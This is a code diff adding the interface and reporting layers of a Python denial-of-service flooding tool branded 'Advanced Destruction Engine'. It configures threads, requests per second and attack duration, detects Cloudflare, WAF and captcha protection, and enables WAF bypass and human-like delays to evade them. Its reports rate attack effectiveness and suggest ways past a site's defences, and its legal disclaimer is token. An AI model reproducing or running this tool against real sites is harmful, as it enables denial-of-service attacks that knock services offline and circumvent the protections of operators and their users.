+        console.print("[red]✗ Please enter a valid number![/]")
+    
+    # RPS
+    while True:
+        rps = input(f"Requests per second [{Config.MAX_RPS}]: ").strip()
+        if not rps:
+            break
+        if rps.isdigit() and int(rps) > 0:
+            Config.MAX_RPS = int(rps)
+            break
+        console.print("[red]✗ Please enter a valid number![/]")
+    
+    # Duration
+    while True:
+        duration = input(f"Attack duration in seconds [{Config.ATTACK_DURATION}]: ").strip()
+        if not duration:
+            break
+        if duration.isdigit() and int(duration) > 0:
+            Config.ATTACK_DURATION = int(duration)
+            break
+        console.print("[red]✗ Please enter a valid number![/]")
+    
+    # WAF bypass
+    waf_bypass = input(f"Enable WAF bypass? (y/n) [y]: ").strip().lower()
+    Config.ENABLE_WAF_BYPASS = waf_bypass != 'n'
+    
+    # Human-like delays
+    human_delays = input(f"Enable human-like delays? (y/n) [y]: ").strip().lower()
+    Config.HUMAN_LIKE_DELAYS = human_delays != 'n'
+    
+    console.print(f"\n[green]✓ Configuration saved:[/]")
+    console.print(f"  • Threads: {Config.MAX_THREADS}")
+    console.print(f"  • RPS Limit: {Config.MAX_RPS}")
+    console.print(f"  • Duration: {Config.ATTACK_DURATION}s")
+    console.print(f"  • WAF Bypass: {'[green]ENABLED[/]' if Config.ENABLE_WAF_BYPASS else '[red]DISABLED[/]'}")
+    console.print(f"  • Human-like: {'[green]ENABLED[/]' if Config.HUMAN_LIKE_DELAYS else '[red]DISABLED[/]'}")
+
+async def run_smart_attack(target_url):
+    """Run smart attack with protection bypass"""
+    # Parse target
+    target = TargetInfo(target_url)
+    if not target.parse():
+        console.print("[red]✗ Failed to parse target URL![/]")
+        return
+    
+    AttackMonitor.current_target = f"{target.protocol}://{target.host}:{target.port}"
+    
+    # Advanced scanning and detection
+    with console.status("[bold green]🔍 Scanning target for protections...[/]") as status:
+        if target.scan_and_detect():
+            console.print("[green]✅ Target scan completed![/]")
+            
+            # Show detected technologies
+            if target.technologies:
+                tech_text = ", ".join(target.technologies[:5])
+                if len(target.technologies) > 5:
+                    tech_text += f" and {len(target.technologies)-5} more"
+                console.print(f"[cyan]Technologies:[/] {tech_text}")
+            
+            # Show protection status
+            if target.protection_detected:
+                console.print(f"[red]⚠️  PROTECTION DETECTED: {target.protection_type.upper()}[/]")
+                
+                # Adjust configuration for protected sites
+                if target.protection_type in ['cloudflare', 'captcha']:
+                    Config.MAX_RPS = min(Config.MAX_RPS, 1000)
+                    Config.REQUEST_TIMEOUT = 25
+                    console.print("[yellow]🔧 Adjusting configuration for protected site...[/]")
+                    console.print(f"[yellow]   • Max RPS reduced to: {Config.MAX_RPS}[/]")
+                    console.print(f"[yellow]   • Timeout increased to: {Config.REQUEST_TIMEOUT}s[/]")
+            
+            # Show vulnerabilities
+            if target.vulnerabilities:
+                console.print(f"[yellow]🔓 Potential vulnerabilities:[/] {', '.join(target.vulnerabilities[:3])}")
+        
+        else:
+            console.print("[yellow]⚠️  Target scan failed, proceeding with basic detection[/]")
+    
+    # Create smart attack manager
+    manager = SmartAttackManager(target)
+    
+    # Start monitor
+    monitor_thread = threading.Thread(target=AttackMonitor.display_dashboard, daemon=True)
+    monitor_thread.start()
+    
+    # Start attack
+    AttackState.attacking = True
+    AttackState.start_time = time.time()
+    
+    console.print(f"\n[bold red]🚀 LAUNCHING SMART ATTACK ON {target.host}...[/]")
+    
+    if target.protection_detected:
+        console.print(f"[yellow]🛡️  Using advanced {target.protection_type.upper()} bypass techniques[/]")
+    
+    console.print("[yellow]Press Ctrl+C to stop the attack[/]")
+    
+    # Countdown
+    console.print("[yellow]Starting in:[/]")
+    for i in range(3, 0, -1):
+        console.print(f"[red]{i}...[/]")
+        time.sleep(1)
+    
+    try:
+        await manager.start_smart_attack(Config.MAX_THREADS)
+    except KeyboardInterrupt:
+        console.print("\n[yellow]⚠️  Attack interrupted by user[/]")
+    except Exception as e:
+        console.print(f"[red]✗ Attack error: {e}[/]")
+    finally:
+        AttackState.attacking = False
+        time.sleep(1)  # Wait for monitor to update
+        
+        # Show final report
+        show_final_report(target)
+        def show_final_report(target):
+    """Show comprehensive final attack report"""
+    stats = AttackMonitor.calculate_stats()
+    
+    # Calculate additional metrics
+    total_time = stats['elapsed_time']
+    hours = total_time // 3600
+    minutes = (total_time % 3600) // 60
+    seconds = total_time % 60
+    
+    avg_rps = stats['total_requests'] / max(total_time, 1)
+    block_rate = (stats['blocked'] / max(stats['total_requests'], 1)) * 100
+    error_rate = (stats['errors'] / max(stats['total_requests'], 1)) * 100
+    
+    # Protection analysis
+    protection_analysis = ""
+    if stats['cloudflare_detected']:
+        protection_analysis = "[red]☁️ CLOUDFLARE PROTECTION ACTIVE[/] - Advanced bypass techniques used"
+    elif stats['waf_detected']:
+        protection_analysis = "[yellow]🛡️ WAF PROTECTION ACTIVE[/] - Evasion techniques applied"
+    else:
+        protection_analysis = "[green]✅ NO MAJOR PROTECTION DETECTED[/]"
+    
+    report = f"""
+    ╔══════════════════════════════════════════════════════════════════════════╗
+    ║                     ATTACK COMPLETE - DETAILED REPORT                    ║
+    ╠══════════════════════════════════════════════════════════════════════════╣
+    ║                                                                          ║
+    ║  🎯 [bold cyan]TARGET INFORMATION[/]                                      ║
+    ║  ────────────────────────────────────────────────────────────────        ║
+    ║  URL:          {target.protocol}://{target.host}:{target.port:<30} ║
+    ║  IP Address:   {target.ip:<40} ║
+    ║  Protection:   {protection_analysis:<30} ║
+    ║                                                                          ║
+    ║  ⏱️  [bold cyan]TIME STATISTICS[/]                                        ║
+    ║  ────────────────────────────────────────────────────────────────        ║
+    ║  Total Duration:   {hours:02d}:{minutes:02d}:{seconds:02d} (HH:MM:SS)          ║
+    ║  Average RPS:      {avg_rps:,.1f} requests/second{'':<20} ║
+    ║  Peak RPS:         {stats['peak_rps']:,} requests/second{'':<20} ║
+    ║                                                                          ║
+    ║  📊 [bold cyan]REQUEST STATISTICS[/]                                      ║
+    ║  ────────────────────────────────────────────────────────────────        ║
+    ║  Total Requests:   {stats['total_requests']:,}{'':<30} ║
+    ║  Successful:       {stats['successful']:,} ({stats['success_rate']:.1f}%){'':<20} ║
+    ║  Blocked:          {stats['blocked']:,} ({block_rate:.1f}%){'':<20} ║
+    ║  Errors:           {stats['errors']:,} ({error_rate:.1f}%){'':<20} ║
+    ║                                                                          ║
+    ║  💾 [bold cyan]DATA TRANSFER[/]                                          ║
+    ║  ────────────────────────────────────────────────────────────────        ║
+    ║  Sent:             {stats['bytes_sent_mb']:.1f} MB{'':<35} ║
+    ║  Received:         {stats['bytes_recv_mb']:.1f} MB{'':<35} ║
+    ║  Bandwidth (Avg):  ▲ {stats['mbps_sent']:.1f} MB/s | ▼ {stats['mbps_recv']:.1f} MB/s{'':<10} ║
+    ║                                                                          ║
+    ║  🔧 [bold cyan]CONFIGURATION USED[/]                                      ║
+    ║  ────────────────────────────────────────────────────────────────        ║
+    ║  Threads:          {Config.MAX_THREADS}{'':<40} ║
+    ║  Max RPS:          {Config.MAX_RPS:,}{'':<40} ║
+    ║  WAF Bypass:       {'ENABLED' if Config.ENABLE_WAF_BYPASS else 'DISABLED'}{'':<40} ║
+    ║  Human-like Mode:  {'ENABLED' if Config.HUMAN_LIKE_DELAYS else 'DISABLED'}{'':<40} ║
+    ║                                                                          ║
+    ║  🌐 [bold cyan]NETWORK INFORMATION[/]                                     ║
+    ║  ────────────────────────────────────────────────────────────────        ║
+    ║  Unique IPs Used:  {stats['unique_ips']}{'':<40} ║
+    ║  SSL Enabled:      {'YES' if target.ssl_enabled else 'NO'}{'':<40} ║
+    ║                                                                          ║
+    ╚══════════════════════════════════════════════════════════════════════════╝
+    """
+    
+    console.print(Panel.fit(report, border_style="bold green", padding=(1, 2)))
+    
+    # Show attack effectiveness analysis
+    show_effectiveness_analysis(stats, target)
+
+def show_effectiveness_analysis(stats, target):
+    """Show attack effectiveness analysis"""
+    
+    effectiveness = ""
+    recommendations = []
+    
+    # Analyze success rate
+    if stats['success_rate'] >= 80:
+        effectiveness = "[bold green]EXCELLENT[/] - Attack was highly effective"
+        recommendations.append("Maintain current configuration for similar targets")
+    elif stats['success_rate'] >= 50:
+        effectiveness = "[bold yellow]GOOD[/] - Attack was moderately effective"
+        recommendations.append("Consider increasing threads for better performance")
+    elif stats['success_rate'] >= 20:
+        effectiveness = "[bold orange]FAIR[/] - Attack faced significant resistance"
+        recommendations.append("Try different attack vectors or increase delays")
+    else:
+        effectiveness = "[bold red]POOR[/] - Attack was mostly blocked"
+        recommendations.append("Target has strong protection, consider different approach")
+    
+    # Analyze block rate
+    if stats['blocked'] > stats['successful']:
+        recommendations.append("Target has active protection (WAF/CloudFlare)")
+        recommendations.append("Use more human-like delays and random patterns")
+    
+    # Analyze bandwidth usage
+    if stats['mbps_sent'] < 1.0:
+        recommendations.append("Low bandwidth usage, consider increasing request size")
+    
+    analysis_panel = Panel.fit(
+        f"[bold cyan]📈 ATTACK EFFECTIVENESS ANALYSIS[/]\n\n"
+        f"[yellow]Overall Rating:[/] {effectiveness}\n"
+        f"[green]Success Rate:[/] {stats['success_rate']:.1f}%\n"
+        f"[red]Block Rate:[/] {(stats['blocked']/max(stats['total_requests'],1))*100:.1f}%\n\n"
+        f"[bold yellow]💡 RECOMMENDATIONS:[/]\n"
+        + "\n".join([f"  • {rec}" for rec in recommendations]),
+        border_style="bold yellow",
+        padding=(1, 2)
+    )
+    
+    console.print(analysis_panel)
+    
+    # Save report to file
+    save_report_to_file(stats, target, recommendations)
+
+def save_report_to_file(stats, target, recommendations):
+    """Save attack report to file"""
+    try:
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"attack_report_{target.host}_{timestamp}.txt"
+        
+        with open(filename, 'w') as f:
+            f.write("=" * 60 + "\n")
+            f.write("ADVANCED DESTRUCTION ENGINE - ATTACK REPORT\n")
+            f.write("=" * 60 + "\n\n")
+            
+            f.write(f"Target: {target.protocol}://{target.host}:{target.port}\n")
+            f.write(f"IP Address: {target.ip}\n")
+            f.write(f"Attack Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+            
+            f.write("-" * 60 + "\n")
+            f.write("STATISTICS\n")
+            f.write("-" * 60 + "\n")
+            f.write(f"Total Requests: {stats['total_requests']:,}\n")
+            f.write(f"Successful: {stats['successful']:,} ({stats['success_rate']:.1f}%)\n")
+            f.write(f"Blocked: {stats['blocked']:,}\n")
+            f.write(f"Errors: {stats['errors']:,}\n")
+            f.write(f"Duration: {stats['elapsed_time']} seconds\n")
+            f.write(f"Average RPS: {stats['total_requests']/max(stats['elapsed_time'],1):.1f}\n")
+            f.write(f"Peak RPS: {stats['peak_rps']:,}\n")
+            f.write(f"Data Sent: {stats['bytes_sent_mb']:.1f} MB\n")
+            f.write(f"Data Received: {stats['bytes_recv_mb']:.1f} MB\n\n")
+            
+            f.write("-" * 60 + "\n")
+            f.write("CONFIGURATION\n")
+            f.write("-" * 60 + "\n")
+            f.write(f"Threads: {Config.MAX_THREADS}\n")
+            f.write(f"Max RPS: {Config.MAX_RPS}\n")
+            f.write(f"WAF Bypass: {'Enabled' if Config.ENABLE_WAF_BYPASS else 'Disabled'}\n")
+            f.write(f"Human-like Mode: {'Enabled' if Config.HUMAN_LIKE_DELAYS else 'Disabled'}\n\n")
+            
+            f.write("-" * 60 + "\n")
+            f.write("RECOMMENDATIONS\n")
+            f.write("-" * 60 + "\n")
+            for rec in recommendations:
+                f.write(f"• {rec}\n")
+            
+            f.write("\n" + "=" * 60 + "\n")
+            f.write("END OF REPORT\n")
+            f.write("=" * 60 + "\n")
+        
+        console.print(f"[green]📄 Report saved to: {filename}[/]")
+        
+    except Exception as e:
+        console.print(f"[yellow]⚠️  Could not save report: {e}[/]")
+
+def main():
+    """Main function"""
+    try:
+        show_banner()
+        
+        # Legal disclaimer
+        disclaimer = Panel.fit(
+            "[bold red]⚠️  LEGAL DISCLAIMER[/]\n\n"
+            "[yellow]This tool is for EDUCATIONAL and AUTHORIZED testing ONLY![/]\n"
+            "[cyan]By using this tool, you agree to:[/]\n"
+            "1. Use only on systems you own or have explicit permission to test\n"
+            "2. Comply with all applicable laws and regulations\n"
+            "3. Accept full responsibility for your actions\n"
+            "4. Not use for malicious purposes\n\n"
+            "[green]Press Enter to accept and continue...[/]",
+            border_style="bold red",
+            padding=(1, 2)
+        )
+        
+        console.print(disclaimer)
+        input()
+        
+        # Get target
+        target_url = get_target()
+        
+        # Configure attack
+        configure_attack()
+        
+        # Final confirmation
+        console.print(f"\n[bold yellow]⚠️  FINAL CONFIRMATION[/]")
+        console.print(f"[cyan]Target:[/] {target_url}")
+        console.print(f"[cyan]Threads:[/] {Config.MAX_THREADS}")
+        console.print(f"[cyan]RPS Limit:[/] {Config.MAX_RPS}")
+        console.print(f"[cyan]Duration:[/] {Config.ATTACK_DURATION}s")
+        console.print(f"[cyan]WAF Bypass:[/] {'[green]ENABLED[/]' if Config.ENABLE_WAF_BYPASS else '[red]DISABLED[/]'}")
+        console.print(f"[cyan]Human-like:[/] {'[green]ENABLED[/]' if Config.HUMAN_LIKE_DELAYS else '[red]DISABLED[/]'}")
+        
+        confirm = input("\n👉 Type 'START' to launch attack, anything else to cancel: ").strip().upper()
+        
+        if confirm != 'START':
+            console.print("[yellow]✗ Attack cancelled[/]")
+            return
+        
+        # Run attack
+        asyncio.run(run_smart_attack(target_url))
+        
+        # Ask for another attack
+        restart = input("\n👉 Launch another attack? (y/n): ").strip().lower()
+        if restart == 'y':
+            # Reset stats
+            AttackState.stats = {
+                'total_requests': 0,
+                'successful': 0,
+                'blocked': 0,
+                'errors': 0,
+                'bytes_sent': 0,
+                'bytes_received': 0,
+                'peak_rps': 0,
+                'current_rps': 0,
+                'targets_hit': 0,
+                'unique_ips': set(),
+                'waf_detected': False,
+                'cloudflare_detected': False
+            }
+            AttackState.last_count = 0
+            AttackState.attacking = False
+            AttackState.start_time = 0
+            
+            # Clear screen and restart
+            os.system('clear' if os.name == 'posix' else 'cls')
+            main()
+        else:
+            console.print("\n[bold green]👋 Thank you for using Advanced Destruction Engine v6.0![/]")
+            console.print("[yellow]Remember: Use this tool only for authorized testing![/]")
+            console.print("[cyan]GitHub: https://github.com/Irfan430/crackar[/]")
+            sys.exit(0)
             
     except KeyboardInterrupt:
-        print(f"\n{Fore.YELLOW}[!] Program terminated by user{Style.RESET_ALL}")
+        console.print("\n[yellow]⚠️  Program interrupted by user[/]")
         sys.exit(0)
     except Exception as e:
-        print(f"\n{Fore.RED}[!] Fatal error: {str(e)}{Style.RESET_ALL}")
+        console.print(f"[red]✗ Unexpected error: {e}[/]")
+        import traceback
+        traceback.print_exc()
         sys.exit(1)
 
 if __name__ == "__main__":
-    # Check Python version
-    if sys.version_info < (3, 7):
-        print(f"{Fore.RED}[!] Python 3.7 or higher is required{Style.RESET_ALL}")
-        sys.exit(1)
-    
-    # Check for required modules
+    # Check and install missing dependencies
     try:
-        import colorama
+        import requests
     except ImportError:
-        print(f"{Fore.RED}[!] Please install required modules: pip install colorama{Style.RESET_ALL}")
-        sys.exit(1)
+        console.print("[yellow]⚠️  'requests' module not found. Installing...[/]")
+        import subprocess
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+        import requests
     
-    # Run main function
-    main()
+    # Check for rich library
+    try:
+        from rich import print
+    except ImportError:
+        console.print("[yellow]⚠️  'rich' module not found. Installing...[/]")
+        import subprocess
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "rich"])
+    
+    # Check for aiohttp
+    try:
+        import aiohttp
+    except ImportError:
+        console.print("[yellow]⚠️  'aiohttp' module not found. Installing...[/]")
+        import subprocess
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp"])
+    
+    try:
+        main()
+    except KeyboardInterrupt:
+        console.print("\n[yellow]👋 Exiting Advanced Destruction Engine...[/]")
+        sys.exit(0)
+    except Exception as e:
+        console.print(f"[red]✗ Fatal error: {e}[/]")
+        console.print("[yellow]Troubleshooting steps:[/]")
+        console.print("1. Install requirements: pip install rich aiohttp colorama requests")
+        console.print("2. Check Python version (3.7+ required)")
+        console.print("3. Run with: python crackar.py")
+        console.print("4. Report issues: https://github.com/Irfan430/crackar/issues")
+        sys.exit(1)
